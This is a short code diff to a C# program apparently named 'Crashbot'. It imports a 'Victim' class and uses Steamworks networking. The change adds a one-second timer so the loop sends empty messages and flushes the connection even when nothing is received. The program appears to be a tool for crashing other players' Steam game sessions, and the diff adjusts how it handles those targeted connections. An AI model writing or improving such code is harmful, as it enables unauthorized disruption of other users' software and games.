@@ -1,6 +1,7 @@
 ﻿using Steamworks;
 using System.Collections.Concurrent;
 using System.Data;
+using System.Diagnostics;
 using System.Security.Cryptography;
 using System.Text;
 using static Crashbot.Victim;
@@ -146,11 +147,12 @@ namespace Crashbot
                 SteamNetConnectionInfo_t info = ix.Value;
                 HSteamNetConnection conn = cx.Value;
 
+                Stopwatch timeGate = Stopwatch.StartNew();
                 while (true)
                 {
                     int messageCount = this.SteamThread.Get(SteamNetworkingSockets.ReceiveMessagesOnConnection, conn, new IntPtr[1], 1);
 
-                    if (messageCount > 0)
+                    if (messageCount > 0 || timeGate.ElapsedMilliseconds > 1000)
                     {
                         this.SteamThread.SendMessageToConnection(conn, 0, 0, 0);
                         this.SteamThread.Get(SteamNetworkingSockets.FlushMessagesOnConnection, conn);
